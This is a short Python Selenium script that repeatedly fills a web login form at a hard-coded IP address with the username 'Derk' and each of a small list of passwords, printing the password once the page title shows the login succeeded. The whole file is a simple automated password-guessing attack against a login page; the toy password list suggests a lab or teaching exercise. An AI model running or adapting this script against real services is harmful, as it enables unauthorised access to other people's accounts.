from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By


s = Service(executable_path="chromedriver.exe")

driver = webdriver.Chrome(service=s)

website = "http://141.87.59.225:5000/login"

driver.get(website)

title=""

passwords = ["sdfsdf", "dfsdf", "dfhjf","pass"]

i = 0

for passw in passwords:
    print("Testing this password", passw)

    res = driver.find_elements(By.CLASS_NAME, "form-control")

    assert(len(res) == 2)

    res[0].clear()
    res[0].send_keys("Derk")
    res[1].clear()
    res[1].send_keys(passw)

    but = driver.find_elements(By.CLASS_NAME, "btn")
    assert(len(but) == 1)
    but[0].click()

    print(driver.title)

    if driver.title != "Login Page":
        print(f"Password is {passw}")
        break

driver.quit()


